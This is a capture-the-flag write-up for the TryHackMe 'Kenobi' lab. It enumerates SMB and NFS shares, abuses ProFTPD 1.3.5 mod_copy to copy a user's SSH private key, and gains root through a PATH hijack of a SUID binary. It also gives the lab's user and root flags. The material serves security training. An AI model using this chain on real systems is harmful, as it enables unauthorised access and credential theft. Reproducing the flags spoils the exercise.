# Kenobi

**Date:** 16, May, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/kenobi) to go to the TryHackMe room.

## Nmap Enumeration

### Scan the machine with nmap, how many ports are open?
- **Answer:** 7
- **Steps to Reproduce:** 

```bash
$ nmap -sC -sV 10.10.108.221 -oN nmap.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 22:10 IST

Nmap scan report for 10.10.108.221
Host is up (0.21s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      47423/tcp   mountd
|   100005  1,2,3      50885/udp6  mountd
|   100005  1,2,3      58983/tcp6  mountd
|   100005  1,2,3      60290/udp   mountd
|   100021  1,3,4      34811/tcp6  nlockmgr
|   100021  1,3,4      45227/tcp   nlockmgr
|   100021  1,3,4      52659/udp   nlockmgr
|   100021  1,3,4      60533/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-05-16T11:41:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-16T16:41:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds
```

---

## Enumerating Samba for Shares
- Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.
- SMB has two ports, 445 and 139.

### Using the nmap command above, how many shares have been found?
- **Answer:** 3
- **Steps to Reproduce:** 

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.108.221 -oN nmap-smb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 22:16 IST
Nmap scan report for 10.10.108.221
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.108.221\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.108.221\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.108.221\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 25.05 seconds
```

### What is the file can you see?
- **Answer:** log.txt
- **Steps to Reproduce:** 
    - Connect to the `anonymous` SMB share with a blank password

```bash
$ smbclient //10.10.108.221/anonymous
Enter WORKGROUP\roots password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Wed Sep  4 16:26:07 2019
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

		9204224 blocks of size 1024. 6877104 blocks available
```

### Recursively download the SMB share using smbget

```bash
$ smbget -R smb://10.10.108.221/anonymous
Password for [root] connecting to //anonymous/10.10.108.221: 
Using workgroup WORKGROUP, user root
smb://10.10.108.221/anonymous/log.txt                                                                           
Downloaded 11.95kB in 5 seconds
```

### What port is FTP running on?
- **Answer:** 21

### What mount can we see?
- **Answer:** /var
- **Steps to Reproduce:** 
    - Nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts **remote procedure call (RPC)** program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.
    - In our case, **port 111** is access to a **network file system**. Lets use nmap to enumerate this.

```bash
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.108.221
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 22:28 IST
Nmap scan report for 10.10.108.221
Host is up (0.17s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836536.0  6877092.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```

---

## Gain initial access with ProFtpd

### What is the version of ProFtpd?
- **Answer:** 1.3.5
- **Steps to Reproduce:** Check out the nmap results or connect using `nc <MACHINE_IP> 21`.

```bash
$ nc 10.10.108.221 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.108.221]
```

### How many exploits are there for the ProFTPd running? 
- **Answer:** 3
- **Steps to Reproduce:** 
    - By using **searchsploit**, we can find the exploits:

```bash
$ searchsploit ProFTPd 1.3.5
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                           | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                     | linux/remote/36742.txt
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

### Using SITE CPFR & SITE CPTO
- **SITE CPFR** - This SITE command specifies the source file/directory to use for copying from one place to another directly on the server.
- **SITE CPTO** - This SITE command specifies the destination file/directory to use for copying from one place to another directly on the server.

```bash
$ nc 10.10.108.221 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.108.221]

SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name

SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Mounting the /var/tmp directory to our machine

```bash
$ mkdir /mnt/kenobiNFS
$ mount 10.10.108.221:/var /mnt/kenobiNFS

$ ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 May 16 22:54 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 13  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 27  2019 mail
drwxr-xr-x  2 root root    4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 30  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 May 16 22:49 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www

$ ls -la /mnt/kenobiNFS/tmp
total 28
drwxrwxrwt  6 root root 4096 May 16 22:49 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
-rw-r--r--  1 ds   ds   1675 May 16 22:49 id_rsa
drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------  3 root root 4096 May 16 22:08 systemd-private-d12feb6c5fe5457680089dceb1e3ae69-systemd-timesyncd.service-15xzHQ
drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
```

- Copy the **Private SSH key** in `/var/tmp` to local and then unmount the file system.

```bash
$ cp /mnt/kenobiNFS/tmp/id_rsa .

$ umount /mnt/kenobiNFS
```

### What is Kenobi's user flag (/home/kenobi/user.txt)?
- **Answer:** d0b0f3f53b6caa532a83915e19224899
- **Steps to Reproduce:** 

```bash
$ chmod 600 id_rsa 

$ ssh -i id_rsa kenobi@10.10.108.221
The authenticity of host '10.10.108.221 (10.10.108.221)' cant be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.108.221' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.

Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

---

## Privilege Escalation with Path Variable Manipulation

- **SUID bits** can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

```bash
kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

### What file looks particularly out of the ordinary? 
- **Answer:** /usr/bin/menu
    - Usually in such vulnerable machines, we can find the binaries like `/usr/bin/sudo` and `/usr/bin/su` having SUID bit set! But we can't exploit this becuase, we don't have **kenobi's password**.
    - So, `/usr/bin/menu` seemed to be out of the ordinary.

### Run the binary, how many options appear?
- **Answer:** 3
- **Steps to Reproduce:** 

```bash
$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

### Finding the approriate binaries

- On running the the various options of the `/usr/bin/menu`, we find that the three binaries are being run as root:
    - /usr/bin/curl (curl -I localhost)
    - /usr/bin/uname (uname -r)
    - /sbin/ifconfig (ipconfig)

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 16 May 2021 17:33:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:f5:a8:1e:1a:65  
          inet addr:10.10.108.221  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::f5:a8ff:fe1e:1a65/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:82827 errors:0 dropped:0 overruns:0 frame:0
          TX packets:79967 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3791786 (3.7 MB)  TX bytes:4548369 (4.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:214 errors:0 dropped:0 overruns:0 frame:0
          TX packets:214 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:16037 (16.0 KB)  TX bytes:16037 (16.0 KB)
```

### Manipulating the Path Variable

- Copy the `/bin/sh` binary to `curl` in the tmp directory: `echo /bin/sh > curl`
- Change the permission to 777: `chmod 777 curl`.
- Modify the **PATH** variable, so the `/tmp` directory is checked first.

```bash
kenobi@kenobi:~$ cd /tmp/

kenobi@kenobi:/tmp$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

kenobi@kenobi:/tmp$ echo /bin/sh > curl

kenobi@kenobi:/tmp$ chmod 777 curl

kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH

kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

### Privilege Escalation

- Execute the `/usr/bin/menu` binary and choose the option 1.

```bash
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

### What is the root flag (/root/root.txt)?
- **Answer:** 177b3cd8562289f37382721c28381f02
- **Steps to Reproduce:** 

```bash
# cd /root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
```

---

## References
- [ProFtpd - mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html)